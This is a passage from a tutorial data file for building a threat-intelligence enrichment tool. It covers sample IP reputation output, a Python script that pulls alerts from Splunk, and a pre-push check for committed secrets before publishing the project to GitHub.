        "==============================================================\nENRICHMENT REPORT — 3 indicators\n==============================================================\n\nIP  185.220.101.44\n    VirusTotal : 12 malicious  (Foundation for Applied Privacy, AT)\n    AbuseIPDB  : score 100  from 847 reports  [TOR EXIT NODE]\n    >>> MALICIOUS — block and hunt",
      fixes: [
        {
          problem: "ModuleNotFoundError: No module named 'extract'",
          cause: "The helper files are not in the directory you ran from.",
          fix: "All five <code>.py</code> files must sit in the same folder, and you must run the script from that folder.",
        },
      ],
    },
    {
      title: "Connect it to Splunk",
      time: "40 min",
      why: "A tool you have to feed by hand is a demo. One that reads alerts automatically is a system.",
      body: "<p>Have the script pull triggered alerts straight out of Splunk rather than a text file.</p>",
      commands: [
        {
          lang: "bash",
          label: "Install the Splunk SDK",
          code: "pip install splunk-sdk",
        },
        {
          lang: "python",
          label: "from_splunk.py",
          code: "import os\nimport splunklib.client as client\nimport splunklib.results as results\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\n\ndef recent_alerts(search: str, minutes: int = 60) -> str:\n    \"\"\"Return matching events as one blob of text for the extractor.\"\"\"\n    service = client.connect(\n        host=os.getenv('SPLUNK_HOST', '192.168.56.10'),\n        port=8089,\n        username=os.getenv('SPLUNK_USER', 'admin'),\n        password=os.getenv('SPLUNK_PASS'))\n\n    job = service.jobs.oneshot(\n        f'search {search}',\n        earliest_time=f'-{minutes}m',\n        latest_time='now',\n        output_mode='json')\n\n    return '\\n'.join(str(r) for r in results.JSONResultsReader(job))\n\n\nif __name__ == '__main__':\n    print(recent_alerts('index=main EventCode=4625 | head 20'))",
        },
      ],
      expect:
        "<p>Events pulled straight from Splunk and fed into the same enrichment path. Add <code>SPLUNK_PASS</code> to your <code>.env</code> — never in the code.</p>",
      fixes: [
        {
          problem: "SSL certificate verify failed",
          cause: "Splunk uses a self-signed certificate by default.",
          fix: "For a lab, pass <code>verify=False</code> to <code>client.connect()</code>. Never do this against production — fix the certificate instead.",
        },
      ],
    },
    {
      title: "Document and publish it",
      time: "30 min",
      why: "This is the most demonstrable thing you will build. Package it so someone can run it in two minutes.",
      body: "<p>Write a README covering: what it does, install steps, where to get API keys, an example run with output, and — importantly — the limitations. Note the rate limits, note that a clean VirusTotal result does not mean safe, note that domain extraction is imperfect.</p><p>Being explicit about what your tool does <i>not</i> do is what makes an experienced reviewer trust the parts that it does.</p><p>Then push it to GitHub. Double-check <code>.env</code> is not in the commit:</p>",
      commands: [
        {
          lang: "bash",
          label: "Verify no secrets before pushing",
          code: "git init && git add -A\ngit status --short          # .env must NOT be listed\n\n# Belt and braces — search the staged content for key-shaped strings\ngit diff --cached | grep -iE 'api[_-]?key|secret|password' || echo 'clean'",
        },
      ],
      expect:
        "<p><code>.env</code> absent from <code>git status</code>, and the grep printing <code>clean</code>. Only then commit and push.</p>",
    },
  ],
  after: [
    "Add sources as you need them: Shodan for what a host exposes, GreyNoise to filter out internet background scanning, URLhaus for malware distribution URLs.",
    "GreyNoise in particular is worth adding early — it tells you an IP is scanning the entire internet rather than targeting you specifically, which downgrades a lot of alerts instantly.",
    "Time yourself doing manual enrichment versus running the script. That number is your interview answer.",
    "Never run this against indicators from a real employer without checking their policy — third-party lookups disclose data.",
  ],
};
